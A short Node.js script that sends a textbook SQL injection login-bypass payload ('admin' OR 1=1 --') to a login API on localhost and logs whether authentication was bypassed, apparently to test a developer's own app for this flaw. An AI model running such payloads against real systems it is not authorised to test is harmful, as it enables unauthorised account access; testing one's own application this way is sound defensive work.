const axios = require('axios');

async function performSQLInjection() {
  try {
    const payload = {
      username: "admin' OR 1=1 --",
    password: "anything"
    };

    console.log('Attempting SQL injection attack...');
    console.log('Payload:', payload);

    const response = await axios.post('http://localhost:5000/api/users/login', payload);
    
    console.log('Response Status:', response.status);
    console.log('Response Data:', response.data);
    
    if (response.status === 200) {
      console.log('SQL Injection SUCCESSFUL! Authentication bypassed.');
    } else {
      console.log('SQL Injection failed. The application might be protected.');
    }
  } catch (error) {
    console.error('Error:', error.response ? error.response.data : error.message);
    if (error.response && error.response.status === 401) {
      console.log('SQL Injection failed. The application is likely protected against this attack.');
    }
  }
}

performSQLInjection();